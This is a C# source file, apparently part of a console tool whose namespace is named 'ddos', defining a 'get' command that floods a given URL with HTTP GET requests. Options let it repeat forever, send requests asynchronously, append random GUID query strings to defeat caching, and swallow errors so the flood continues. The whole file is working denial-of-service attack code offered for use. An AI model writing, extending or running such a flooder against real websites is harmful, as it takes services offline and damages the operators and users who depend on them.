using System;
using System.Net;
using Extensions;
using Commands;

namespace ddos.Get
{
    public class GetCommand : BaseCommand
    {
        public override string CommandName
        {
            get
            {
                return "get";
            }
        }

        public override void TryExecute(string command, string[] args)
        {
            if (CommandName.Equals(command))
            {
                if (string.IsNullOrWhiteSpace(args[0]))
                    throw new Exception("url nula");

                Execute(args);
            }
            else if(IsThereNextCommand())
                NextCommand.TryExecute(args[0], args);
        }

        private void Execute(string[] args)
        {
            var url = args[0];
            var uri = new Uri(url);
            var count = 0;

            var proxy = WebProxy.GetDefaultProxy();

            Action asyncOrNot_action = () =>
            {
                var webClient = new WebClient()
                {
                    Proxy = proxy
                };

                if (IsThereAssincronousParameter(args))
                    webClient.DownloadStringAsync(uri); 
                else
                    webClient.DownloadString(uri);
            };

            Action randonParametersOrNot = () =>
            {
                if (IsThereRandonParameter(args))
                {
                    uri = new Uri(string.Format("{0}?{1}={2}", url, Guid.NewGuid(), Guid.NewGuid()));

                    asyncOrNot_action();
                }
                else
                    asyncOrNot_action();
            };

            Action forceOrNot = () =>
            {
                if (IsThereDisableForceParameter(args))
                    randonParametersOrNot.Invoke();
                else
                {
                    try
                    {
                        randonParametersOrNot.Invoke();
                    }
                    catch (NotSupportedException ex)
                    {
                    }
                    catch (Exception ex)
                    {
                    }
                }
            };

            Action ShowCount = () =>
            {
                Console.Clear();
                Console.Write(++count);
            };

            if (IsThereForeverParameter(args))
            {
                while (true)
                {
                    forceOrNot();

                    ShowCount();
                }
            }
            else
            {
                for (int i = 0; i < (TryGetQuantityParameter(args) ?? 1); i++)
                {
                    forceOrNot();

                    ShowCount();
                }
            }
        }

        private bool IsThereRandonParameter(string[] args)
        {
            return args.Contains("-rp") || args.Contains("-randon_parameters");
        }

        private Int64? TryGetQuantityParameter(string[] args)
        {
            for (int i = 0; i < args.Length; i++)
            {
                if (args[i] == "-q" || args[i] == "-quantity")
                {
                    return Int64.Parse(args[i + 1]);
                }
            }

            return null;
        }

        private bool IsThereForeverParameter(string[] args)
        {
            return args.Contains("-rf") || args.Contains("-repeat_forever");
        }

        private bool IsThereAssincronousParameter(string[] args)
        {
            return args.Contains("-a") || args.Contains("-async");
        }

        private bool IsThereDisableForceParameter(string[] args)
        {
            return args.Contains("-df") || args.Contains("-disable-force");
        }
    }
}